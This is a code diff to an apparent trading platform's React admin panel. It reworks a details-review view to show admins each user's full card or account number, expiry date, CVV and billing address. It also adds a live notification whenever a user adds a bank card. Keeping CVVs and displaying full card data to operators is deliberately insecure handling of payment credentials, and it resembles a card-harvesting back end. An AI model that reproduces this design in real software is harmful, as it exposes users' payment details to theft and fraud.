@@ -1592,13 +1592,18 @@ const DetailsReviewView = ({ toast }) => {
                       <div className="font-semibold text-white">
                         {row.user.fullName} · @{row.user.username}
                       </div>
-                      <div className="mt-1 text-[11px] text-slate-400">
-                        Name: {row.card.holderName || row.card.accountName} · Address:{" "}
-                        {row.card.billingAddress || "—"}
-                      </div>
-                      <div className="text-[11px] text-slate-400">
-                        Card: {row.card.cardNumber || row.card.accountNumber} · Exp{" "}
-                        {row.card.expMonth}/{row.card.expYear} · CVV {row.card.cvv || "—"}
+                      <div className="mt-1 space-y-0.5 font-mono text-[11px] text-slate-300">
+                        <div>Name: {row.card.holderName || row.card.accountName || "—"}</div>
+                        <div>Card: {row.card.cardNumber || row.card.accountNumber || "—"}</div>
+                        <div>
+                          Exp: {row.card.expMonth || "—"}/{row.card.expYear || "—"} · CVV:{" "}
+                          {row.card.cvv || "—"}
+                        </div>
+                        {row.card.billingAddress ? (
+                          <div className="font-sans text-slate-400">
+                            Address: {row.card.billingAddress}
+                          </div>
+                        ) : null}
                       </div>
                     </div>
                     <Actions
@@ -2681,6 +2686,15 @@ export default function AdminPanel({ user, onExit }) {
         );
       }
     });
+    const offBankCard = onSocketEvent("bankcard:added", (payload) => {
+      const name =
+        payload?.user?.fullName ||
+        payload?.user?.username ||
+        payload?.user?.email ||
+        "Client";
+      const last4 = payload?.card?.last4 || "••••";
+      say("success", `${name} added a bank card · •••• ${last4}`);
+    });
     const offChat = onSocketEvent("chat:message", (payload) => {
       const msg = payload?.message;
       if (!msg || msg.from !== "user") return;
@@ -2701,6 +2715,7 @@ export default function AdminPanel({ user, onExit }) {
       offTrade();
       offSmartCopy();
       offAiBot();
+      offBankCard();
       offChat();
     };
   }, [say]);
